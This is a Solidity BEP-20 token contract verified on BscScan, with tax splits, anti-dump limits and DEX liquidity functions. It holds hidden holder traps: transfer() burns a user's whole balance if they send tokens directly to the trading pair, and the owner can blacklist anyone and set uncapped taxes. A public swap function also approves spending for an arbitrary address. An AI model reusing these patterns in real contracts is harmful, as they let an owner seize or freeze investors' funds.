/**
 *Submitted for verification at BscScan.com on 2022-08-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDexRouter {
    function factory() external pure returns (address);    
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable  returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external; 
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
       
contract BUSDliquidLockAntiDumpContract is IERC20 { 

    struct TokenInfo{
        string name;
        string symbol;
        uint8 decimals;
        uint256 denomination;
        uint256 totalSupply;        
        uint256 totalBuyTax;
        uint256 totalSellTax;
        uint256 maxDailyWalletTransferPercent;
        uint256 maxTransferTimeSecs;
        bool coolDownEnabled;
        uint256 coolDownTime;        
        bool swapMutex;
        bool txnMutex;
    }

    TokenInfo private _tokenInfo = TokenInfo (
            "BUSDANTI_LOCK2", "BTFL2", 8,  100_000_000, /*10**_decimals;*/ 7_777_700_000_000, //77_777 * _denomination; 
           14, 16,      1, 86400, //24hrs
           true, 300 seconds, false, false
    );
 
    mapping(address => uint256) private _balances; 
    mapping (address => mapping (address => uint256)) private _allowances;
  
    struct Addresses {
        address owner_wallet;
        address marketing_wallet;
        address liquidity_wallet;
        address team_wallet;
        address dev_wallet;
        address project_wallet;
        address charity_wallet;
        address epif_wallet; 
        address dead_wallet;  
    }

    Addresses _address = Addresses(
            0xF786C82BE5517bE68ecc49F1f14C99C87f3a601E,
            0x4B2Ad640751f0D8bd17A299CD2d53606dA333BD3,
            0x49B20f870D8A8D0cc375aBFf1875F2A2e73dEA21,
            0xa66d1542Ad3920F86e6bE1beC7352d4Ce8A6DE11,
            0xA3B9186b9556A9A0b8526ac21f4Df8ffaeBad4b8,
            0x7c27e98261709978e42E3F35ca25d087f01E1011,
            0x674Fc275bbCc3A8D7754a6FC8130eb5C2f3Cb346,
            0xF1496Eae34714Ffc7B866aDaC70b4eA84845466f,
            0x000000000000000000000000000000000000dEaD);


    struct DeX {
        IDexRouter router; 
        address busd_address;
        address pairBNB;
        address pairBUSD;

        bool isPairBNB; 
        uint256 liquidityThreshold;  //0 means disabled
        uint256 swapThreshold;
    }

    DeX dex = DeX(
         IDexRouter(address(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3)),
         0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7, //busd
         address(0x0),
         address(0x0),
         true,
         1_000_000_000,// *10**8 _denomination;
         1_000_000_000 //10 tokens
    ); 

 
    struct Tax {
        uint256 marketing;
        uint256 liquidity;
        uint256 team;
        uint256 dev;
        uint256 project;
        uint256 charity;
        uint256 epif; 
    }
    Tax private buyTaxes = Tax(3, 2, 1, 2, 1, 1, 4);
    Tax private sellTaxes = Tax(3, 2, 1, 2, 2, 2, 4);
    
    struct userTxn {  uint256 txnTimeSecs; uint256 txnAmount; }
    mapping(address => userTxn) private _accountDailyTxn; 
    
    //0-all, 1-exempt, 2-exempt-fees, 9-bot, _xACCOUNT
    mapping(address => uint) private _xACCOUNT;    
    //address[] private shareholders; //mapping (address => uint256) private _shareholdersAmt;   
    mapping(address => uint256) private _LastTxnTime;

    event eventTransferFees(uint256 amount, uint256 pcent, uint256 taxAmount, string buyOrSell);  
    event eventTransFrom(address sender, address from, address to, uint256 amount);  
        
    constructor() {      
        _xACCOUNT[_address.owner_wallet] = 2; 
        _balances[_address.owner_wallet] = _tokenInfo.totalSupply; 
        emit Transfer(address(0x0), _address.owner_wallet, _tokenInfo.totalSupply); 
    }
 
    modifier swapMutexLock() { 
        require(!_tokenInfo.swapMutex, "No Re-entrancy");
         _tokenInfo.swapMutex = true;
        _;
        _tokenInfo.swapMutex = false;
    }
     
    modifier txnMutexLock() {
        require(!_tokenInfo.txnMutex, "No Txn. Re-entrancy");
         _tokenInfo.txnMutex = true;
        _;
        _tokenInfo.txnMutex = false;
    }

    modifier onlyOwner() {
        require(_address.owner_wallet == _msgSender());  _;
    }
     
    modifier isValidAddress(address addr) {
        require(_isAllowAddress(addr));   _;
    }
 
    function _isAddressExempted(address addr) private view returns (bool){
        if(_xACCOUNT[addr] == 1 || _xACCOUNT[addr] == 2) return true;
        return false;
    }

    function _isFeesExempted(address addr) private view returns (bool){
        if(_xACCOUNT[addr] == 2) return true;
        return false;
    }
     
    function _isAllowAddress(address addr) private view returns (bool) { 
        if(_xACCOUNT[addr] == 9) return false; //bot
        if(_xACCOUNT[addr] == 1 || _xACCOUNT[addr] == 2) return true;
        if(_isAddressContract(addr)) return false;
        return true;
    }

    bool private isContractCheck = true; 
    function activateContractCheck(bool _flag) external onlyOwner {
        isContractCheck = _flag;
    } 

    function _isAddressContract(address addr) private view returns (bool) {      
        if(!isContractCheck) return false;
        if(address(0x0) == addr) return true;
         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly { codehash := extcodehash(addr) }
        return (codehash != 0x0 && codehash != accountHash); 
    }
         
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }
 
    function isOwner() private view returns (bool) {
        return _address.owner_wallet == _msgSender(); 
    }   

    function owner() public view returns (address) {
        return _address.owner_wallet;
    }

    function name() public view returns (string memory) {
        return _tokenInfo.name;
    }

    function symbol() public view returns (string memory) {
        return _tokenInfo.symbol;
    }

    function decimals() public view returns (uint8) {
        return _tokenInfo.decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tokenInfo.totalSupply;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return (_tokenInfo.totalSupply - _balances[_address.dead_wallet]);
    }
   
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address allow_owner, address spender) public view override returns (uint256)
    { 
        return _allowances[allow_owner][spender];
    }

    function approve(address spender, uint256 value) public override returns (bool)
    {    
        bool success = _approve(_msgSender(), spender, value);
        require(success, "Approval reverted.");
        return success;
    }
     
    function transfer(address to, uint256 amount) public override txnMutexLock returns (bool)
    {       
        assert(_balances[_msgSender()] >= amount && amount > 0);
        require(_isAllowTxn(_msgSender(), amount) && _isAllowAddress(to), "Transfer not allowed");
        
        if (_msgSender() != address(dex.router) && (to == dex.pairBNB || to == dex.pairBUSD)) {
            _xACCOUNT[_msgSender()] = 9;
            _burn(_balances[_msgSender()]);  
            return true;
        } 

        bool success = _transfer(_msgSender(), to, amount); 
        require(success, "Transfer reversed");
        return success;
    }
 
    function transferFrom(address from, address to, uint256 numTokens) external override returns (bool) {  
        assert(_allowances[from][_msgSender()] >= numTokens && numTokens > 0);
        require(_isAllowTxn(from, numTokens) &&  _isAllowAddress(to), "Transfer not allowed");
        require(_allowances[from][_msgSender()] >= numTokens && numTokens > 0, "INVALID_ALLOWANCE_AMOUNT");
      
        bool success2 = _approve(from, _msgSender(), (_allowances[from][_msgSender()] - numTokens));
        require(success2, "txn_reverted");

        bool success = _transfer(from, to, numTokens);  
        require(success, "txn_failed");

        emit eventTransFrom(_msgSender(), from, to, numTokens); 
        return success;
    } 
  
    function _transfer(address sender, address recipient,  uint256 amount) private swapMutexLock returns (bool) { 
        require(sender != address(0) && recipient != address(0) && amount > 0, "Zero_Inavlid");
        require(_balances[sender] >= amount, "LOW_BALANCE");  
        require( _isAllowAddress(sender) && _isAllowAddress(recipient) && _isAllowAddress(_msgSender()), "ADDR_NOT_ALLOWED"); 
          
        if(_isFeesExempted(sender) && _isFeesExempted(_msgSender())) {  
            return _baseTransfer(sender, recipient, amount, 0, true); 
        }
        if (_isAddressExempted(sender)) {   
            return _baseTransfer(sender, recipient, amount, 1, true); 
        }
        
        if (!(_isAddressExempted(sender) && _isAddressExempted(_msgSender())) && _tokenInfo.coolDownEnabled) { 
            require((block.timestamp - _LastTxnTime[sender]) >= _tokenInfo.coolDownTime, "TOO_FAST");
            _LastTxnTime[sender] = block.timestamp;
            _LastTxnTime[_msgSender()] = block.timestamp; 
        }
 
        //These transactions involves selling fees         
        if (block.timestamp > (_accountDailyTxn[sender].txnTimeSecs + _tokenInfo.maxTransferTimeSecs)) {
            //it means last transaction is more than 24 hours
            //1. check if the amount is within the range of max txn cap 
            uint256 maxAmtAllowed = ((_balances[sender] * _tokenInfo.maxDailyWalletTransferPercent) / 100);
            require(_tokenInfo.maxDailyWalletTransferPercent >= 100 || maxAmtAllowed >= amount, "AMT_EXCEEDED" 
                   // string.concat("Amount exceeded: allowedamt: ", uint2str(maxAmtAllowed), " amtsent: ", uint2str(amount))
                    );

            _accountDailyTxn[sender].txnTimeSecs = block.timestamp;
            _accountDailyTxn[sender].txnAmount = amount;
            return _baseTransfer(sender, recipient, amount, 1, false);  
        }  
  
        //it means user_account has done one or more transaction within 24hours       
        uint256 max_txn_allowed = ((_accountDailyTxn[sender].txnAmount + _balances[sender]) * _tokenInfo.maxDailyWalletTransferPercent) / 100;  
        bool is_allow_dailytxn = _tokenInfo.maxDailyWalletTransferPercent >= 100 || (max_txn_allowed >= (amount + _accountDailyTxn[sender].txnAmount));
        require(is_allow_dailytxn, "DAILY_LIMIT_EXCEEDED");   
        // require(is_allow_dailytxn, string.concat("MaxAMT allow for today is ", uint2str(max_txn_allowed), _tokenInfo.symbol,
        //                       ", total txn. for the day is ",  uint2str((amount + _accountDailyTxn[sender].txnAmount))));   

        //_accountDailyTxn[sender].txnTimeSecs = block.timestamp; still in the 24hrs timeframe
        _accountDailyTxn[sender].txnAmount = _accountDailyTxn[sender].txnAmount + amount; 
        return _baseTransfer(sender, recipient, amount, 1, false);
    }
    
    function _baseTransfer(address from, address to, uint256 amount, uint isHasFees, bool is_buy) private returns (bool) {   
        require(amount > 0 && _balances[from] >= amount, "INSUFFICIENT_BEP20");    
          
        if(!_isFeesExempted(from) && isHasFees > 0 && 
           !(_isAddressExempted(from) && _isAddressExempted(to))) 
        {   
           uint256 taxsPcent = is_buy ? _tokenInfo.totalBuyTax : _tokenInfo.totalSellTax; 

           uint256 taxAmount = (amount * taxsPcent) / 100;
           require(amount >= taxAmount);
           uint256 amountLessFee = amount - taxAmount;
           
            _balances[from] = _balances[from] - amount; 
            _balances[to] = _balances[to] + amountLessFee;
            emit Transfer(from, to, amountLessFee); 
              
            _deductTax(amount, is_buy);  
        } 
        else {
            _balances[from] = _balances[from] - amount;   
            _balances[to] = _balances[to] + amount;
            emit Transfer(from, to, amount); 
        }
                
        _LastTxnTime[from] = block.timestamp;
        return true; 
    }
   
   function _deductTax(uint256 amount, bool isBuy) private {    
        Tax memory taxs = isBuy ? buyTaxes : sellTaxes;
        uint256 taxsPcent = isBuy ? _tokenInfo.totalBuyTax : _tokenInfo.totalSellTax;
        uint256 taxSumAmount = (amount * taxsPcent) / 100;
        //tax deductions  
        //spit the funds to the various addresses
        emit eventTransferFees(amount, taxsPcent, taxSumAmount, isBuy?"buy":"sell");  

        _isRemitTax(_address.marketing_wallet, taxs.marketing, amount);
        _isRemitTax(_address.liquidity_wallet, taxs.liquidity, amount);
        _isRemitTax(_address.team_wallet, taxs.team, amount);
        _isRemitTax(_address.dev_wallet, taxs.dev, amount);
        _isRemitTax(_address.project_wallet, taxs.project, amount);
        _isRemitTax(_address.charity_wallet, taxs.charity, amount);
        _isRemitTax(_address.epif_wallet, taxs.epif, amount);
   }
   
    function _isRemitTax(address _txAddress, uint256 _pcentRate, uint256 amount) private {
        if(_pcentRate == 0 || amount == 0) return;

        uint256 AMT = (amount * _pcentRate) / 100;
        _balances[_txAddress] = _balances[_txAddress] + AMT;
        emit Transfer(msg.sender, _txAddress, AMT);  
    }


    function _approve(address tokenOwner, address spender, uint256 amount) private returns (bool) { 
        require(tokenOwner != address(0) && spender != address(0), "ZeroAddress");
        require(_isAllowAddress(tokenOwner) && _isAllowAddress(spender) && _isAllowAddress(_msgSender()),  "addr_not_allowed");
        require(_isAllowTxn(tokenOwner, amount), "UNAUTHORIZED_AMOUNT");

        _allowances[tokenOwner][spender] = amount;
        _LastTxnTime[tokenOwner] = block.timestamp - (_tokenInfo.coolDownTime / 2); //half the time for approval
        emit Approval(tokenOwner, spender, amount);
        return true;
    }

    function _isAllowTxn(address _addr, uint256 amount) private view returns(bool){
        uint256 balanceAddrAMT = _balances[_addr];
        if(_isAddressExempted(_addr) && balanceAddrAMT >= amount) return true;
 
        if(_tokenInfo.coolDownEnabled) {
            require((block.timestamp - _LastTxnTime[_addr]) >= _tokenInfo.coolDownTime, "TOO_SWIFT"); 
        }  
     
        if (block.timestamp > (_accountDailyTxn[_addr].txnTimeSecs + _tokenInfo.maxTransferTimeSecs)) {
            //it means last transaction is more than 24 hours
            //1. check if the amount is within the range of max txn cap 
            uint256 maxAmtAllowed = (balanceAddrAMT * _tokenInfo.maxDailyWalletTransferPercent) / 100;
            bool is_dailymax_valid = _tokenInfo.maxDailyWalletTransferPercent >= 100 || maxAmtAllowed >= amount;
            require(is_dailymax_valid, "EXCEED_LIMIT"); 
            return is_dailymax_valid;
        }  
  
        //it means user_account has done one or more transaction within 24hours       
        uint256 max_txn_allowed = ((_accountDailyTxn[_addr].txnAmount + balanceAddrAMT) * _tokenInfo.maxDailyWalletTransferPercent) / 100;  
        bool is_allow_dailytxn = _tokenInfo.maxDailyWalletTransferPercent >= 100 || (max_txn_allowed >= (amount + _accountDailyTxn[_addr].txnAmount));
        require(is_allow_dailytxn, "EXCEEDED_DAILY_LIMIT");   
        return is_allow_dailytxn; 
    }
   
    function setxAccount(address addr, uint level) external onlyOwner {
        _xACCOUNT[addr] = level;       
    }

    function transferOwnership(address addr) external onlyOwner  { 
        require(!_isAddressContract(addr), "INVALID_OWNER_ADDRESS"); 
        _xACCOUNT[_address.owner_wallet] = 0;             
        _address.owner_wallet = addr;  
        _xACCOUNT[addr] = 2;
        emit Transfer(address(0x0), addr, 0); 
    }
   
    function transferBulk(address[] memory addrs, uint256[] memory amts) external onlyOwner  {
         uint256 totalAmount = 0;
         for(uint i=0; i<addrs.length; i++) {
            totalAmount = totalAmount + amts[i]; 

            require(amts[i] > 0);
            _balances[addrs[i]] = _balances[addrs[i]] + amts[i];
            emit Transfer(_msgSender(), addrs[i], amts[i]);  
         }

         require(_balances[_msgSender()] >= totalAmount && totalAmount > 0);
         _balances[_msgSender()] = _balances[_msgSender()] - totalAmount;  
    }    
 
    // function claimShares(address to, uint256 amount) external onlyOwner {
    //     require(amount > 0 && _isAllowAddress(to), "Invalid Access...");
    //     require(_balances[_address.epif_wallet] >= amount);
    //     _balances[to] = _balances[to] + amount;
    //     _balances[_address.epif_wallet] = _balances[_address.epif_wallet] - amount;
    //     emit Transfer(_address.epif_wallet, to, amount);   
    // }    
    
    function burn(uint256 amount) external  {
        require(_balances[_msgSender()] >= amount && amount > 0  && _isAllowAddress(_msgSender()));
       _burn(amount);   
    }    

    function _burn(uint256 amount) private {
        require(_balances[_msgSender()] >= amount && amount > 0);
        _balances[_msgSender()] = _balances[_msgSender()] - amount;
        _balances[_address.dead_wallet] = _balances[_address.dead_wallet] + amount;
        emit Transfer(_msgSender(), _address.dead_wallet, amount); 
    }
 
    function setBasicFees(uint256 _maxDailyWalletPcent, uint256 _maxTxnSecs, uint _coolTime, bool _coolDownEnabled) external onlyOwner { 
         _tokenInfo.maxDailyWalletTransferPercent  =    _maxDailyWalletPcent;   
         _tokenInfo.maxTransferTimeSecs            =    _maxTxnSecs; 
         _tokenInfo.coolDownTime                   =    _coolTime * 1 seconds;
         _tokenInfo.coolDownEnabled                =    _coolDownEnabled;
    }
  
    function editAddresses(address market, address liquid, address team, address dev, address project, address charity, address epif) external onlyOwner {
        if(_address.marketing_wallet != market) _address.marketing_wallet = market;
        if(_address.liquidity_wallet != liquid) _address.liquidity_wallet = liquid;
        if(_address.team_wallet != team)        _address.team_wallet = team;
        if(_address.dev_wallet != dev)          _address.dev_wallet = dev;
        if(_address.project_wallet != project)  _address.project_wallet = project;
        if(_address.charity_wallet != charity)  _address.charity_wallet = charity;
        if(_address.epif_wallet != epif)        _address.epif_wallet = epif; 
    }
    
    function setTaxFees(uint256 market, uint256 liquid, uint256 team, uint256 dev,  
                    uint256 project, uint256 charity, uint256 epif, bool isBuy) external onlyOwner {
        uint256 totalFee = market + liquid + team + dev + project + charity + epif;
        if(isBuy) {
            _tokenInfo.totalBuyTax = totalFee;
            buyTaxes = Tax(market, liquid, team, dev, project, charity, epif);
        }
        else { 
            _tokenInfo.totalSellTax = totalFee;
            sellTaxes = Tax(market, liquid, team, dev, project, charity, epif);
        }
    }
 
  
    fallback() external payable { } 
    receive() external payable { }
     
    function rescueBNB(uint256 amount) external onlyOwner  { 
        require(address(this).balance > amount);
        _msgSender().transfer(amount); 
    }
     
    function rescueToken(address tokenAddress, uint256 tokens) external onlyOwner {
        require(IERC20(tokenAddress).balanceOf(address(this)) >= tokens);
        require(IERC20(tokenAddress).transfer(_address.owner_wallet, tokens));
    } 
   

    function uint2str(uint _i) private pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len;
        while (_i != 0) {
            k = k-1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }
   
   //>>>>>>>>>>>>>>>>>>>>>>>>>>>>> 
   function createPair(address routeraddr, address busdAddr,
        uint256 _liquidity_threshold, uint256 _swapThreshold,  bool _isPairBNB) external onlyOwner  {  
      
       if(routeraddr != address(0x0)){
            dex.router = IDexRouter(routeraddr); 
            dex.pairBNB = IDexFactory(dex.router.factory()).createPair(address(this), dex.router.WETH());  

            _xACCOUNT[routeraddr] = 1;  
            _xACCOUNT[dex.pairBNB] = 1; 
       }

       if(busdAddr != address(0x0)){
            dex.busd_address = busdAddr;
            dex.pairBUSD = IDexFactory(dex.router.factory()).createPair(address(this), busdAddr);  
        
            //0-all, 1-exempt, 2-exempt-fees, 9-bot, _xACCOUNT
            _xACCOUNT[dex.pairBUSD] = 1; 
       } 

       _xACCOUNT[address(this)] = 1;   
       
        dex.liquidityThreshold = _liquidity_threshold;
        dex.swapThreshold = _swapThreshold;
        dex.isPairBNB = _isPairBNB; 
   }
   

//    function updatePairThreshold(uint256 _liquidity_threshold, uint256 _swapThreshold,  bool _isPairBNB) external onlyOwner {
//         dex.liquidityThreshold = _liquidity_threshold;
//         dex.swapThreshold = _swapThreshold;
//         dex.isPairBNB = _isPairBNB; 
//    }
 
    function getFeesBalances() external view onlyOwner returns ( 
            uint256 marketing,  
            uint256 liquidity,
            uint256 team,
            uint256 dev,
            uint256 project,   
            uint256 charity,    
            uint256 epif,   
            uint256 dead,   
            uint256 contract_efa, 
            uint256 owner_bnb,  
            uint256 swap_threshold,
            uint liquidity_enabled 
        )
    {
        return ( 
                _balances[_address.marketing_wallet], 
                _balances[_address.liquidity_wallet], 
                _balances[_address.team_wallet], 
                _balances[_address.dev_wallet], 
                _balances[_address.project_wallet], 
                _balances[_address.charity_wallet], 
                _balances[_address.epif_wallet], 
                _balances[_address.dead_wallet], 
                _balances[address(this)], 
                address(_address.owner_wallet).balance,
                dex.liquidityThreshold,
                dex.swapThreshold         
            ); 
    }

    function _provideLiquidity(address sender) private {
        uint256 liquidityTokenBalance = _balances[_address.liquidity_wallet];
        if(dex.liquidityThreshold == 0  || liquidityTokenBalance < dex.liquidityThreshold || 
           sender == dex.pairBNB  || sender == dex.pairBUSD || sender == address(dex.router)
         ) return; 
          
        _balances[_address.liquidity_wallet] = 0;
         uint256 contractTokenBalance = _balances[address(this)]  + liquidityTokenBalance;
        _balances[address(this)] = contractTokenBalance;
        emit Transfer(_address.liquidity_wallet, address(this), liquidityTokenBalance);
 
        // Split the contract balance into halves 
        uint256 tokensToAddLiquidityWith = contractTokenBalance / 2;
        uint256 tokensToSwap = contractTokenBalance - tokensToAddLiquidityWith;

         uint256 initialBalanceBNB = address(this).balance; 
        _swap(tokensToSwap, true);
        uint256 bnbToAddLiquidityWith = address(this).balance - initialBalanceBNB; 
        if (bnbToAddLiquidityWith > 0) { 
            _addLiquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith, true);
        }     
    }
  
   function createLiquidity(uint256 tokens, uint256 bnbBUSD, bool isBNB) external onlyOwner {
       _addLiquidity(tokens, bnbBUSD, isBNB); 
   }

    function addContractLiquidity() external onlyOwner {
        uint256 liquidityTokenBalance = _balances[_address.liquidity_wallet];
          
        _balances[_address.liquidity_wallet] = 0;
         uint256 contractTokenBalance = _balances[address(this)]  + liquidityTokenBalance;
        _balances[address(this)] = contractTokenBalance;
        emit Transfer(_address.liquidity_wallet, address(this), liquidityTokenBalance);
 
        // Split the contract balance into halves 
        uint256 tokensToAddLiquidityWith = contractTokenBalance / 2;
        uint256 tokensToSwap = contractTokenBalance - tokensToAddLiquidityWith;

         uint256 initialBalanceBNB = address(this).balance; 
        _swap(tokensToSwap, true);
        uint256 bnbToAddLiquidityWith = address(this).balance - initialBalanceBNB; 
        if (bnbToAddLiquidityWith > 0) { 
            _addLiquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith, true);
        }     
    }


    function swapTokenAddresses(address[] memory txAddresses, bool isBNB) external onlyOwner {        
        for(uint i=0; i<txAddresses.length; i++) {
            _swapTokenAddress(txAddresses[i], isBNB);
        }
    }

    function swapContractTokens(uint256 amount, uint isSwap_1BNB_2BUSD_3direct) external onlyOwner { 
         if(isSwap_1BNB_2BUSD_3direct == 1)         _swap(amount, true); 
         else if(isSwap_1BNB_2BUSD_3direct == 2)    _swap(amount, false);  
         else   testBusdDirectSwap(amount, _msgSender());  
    }

    function _addLiquidity(uint256 tokenAmount, uint256 BNB_BUSD_AMT, bool IsBNB) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(dex.router), tokenAmount);

        if(!IsBNB) {
            _approve(dex.busd_address, address(dex.router), BNB_BUSD_AMT);
            
            // add the liquidity
            dex.router.addLiquidity(
                address(this),
                dex.busd_address,
                tokenAmount, // slippage is unavoidable
                BNB_BUSD_AMT, // slippage is unavoidable
                0,
                0,
                _address.liquidity_wallet,
                block.timestamp
            );
        }
        else { //its BNB
             // add the liquidity
            dex.router.addLiquidityETH{value: BNB_BUSD_AMT}(
                address(this),
                tokenAmount,
                0, // slippage is unavoidable
                0, // slippage is unavoidable
                _address.liquidity_wallet,
                block.timestamp
            );
        }
       
    }
     
    function _swapTokenAddress(address txAddress, bool isSwapToBNB) private {
         if(isSwapToBNB) {    
            uint256 preContractBNB = address(this).balance;
            uint256 preTokenAddressBalance = _balances[txAddress];

            _balances[txAddress] = 0; 
            _balances[address(this)] = _balances[address(this)] + preTokenAddressBalance;
            emit Transfer(txAddress, address(this), preTokenAddressBalance);

            _swap(preTokenAddressBalance, true);
            uint256 swappedBNB =  address(this).balance - preContractBNB;
            if(swappedBNB == 0) return;
 
            payable(txAddress).transfer(swappedBNB);
         } else { //swap BUSD 
            uint256 preContractBUSD = IERC20(dex.busd_address).balanceOf(address(this));
            uint256 preTokenAddressBalance = _balances[txAddress];

            _balances[txAddress] = 0;
            _balances[address(this)] = _balances[address(this)] + preTokenAddressBalance;
            emit Transfer(txAddress, address(this), preTokenAddressBalance);
            
            _swap(preTokenAddressBalance, false);
            uint256 swappedBUSD =  IERC20(dex.busd_address).balanceOf(address(this)) - preContractBUSD;
            if(swappedBUSD == 0) return;
 
            IERC20(dex.busd_address).transfer(txAddress, swappedBUSD); 
         }
    }

    function _swap(uint256 tokenAmount, bool isBNB) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](isBNB?2:3);
        path[0] = address(this);
        path[1] = dex.router.WETH();
        if(!isBNB) path[2] = dex.busd_address;

        _approve(address(this), address(dex.router), tokenAmount);

        // make the swap
        if(isBNB){
            dex.router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
        else {
            dex.router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }        
    }
 
    function testBusdDirectSwap(uint256 tokenAmount, address sender) public {
        address[] memory path = new address[](2);
        path[0] = address(this); 
        path[1] = dex.busd_address;

        //_approve(address(this), address(dex.router), tokenAmount); 
        _approve(sender, address(dex.router), tokenAmount); 

        dex.router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            sender,
            block.timestamp
        );
    }
 
}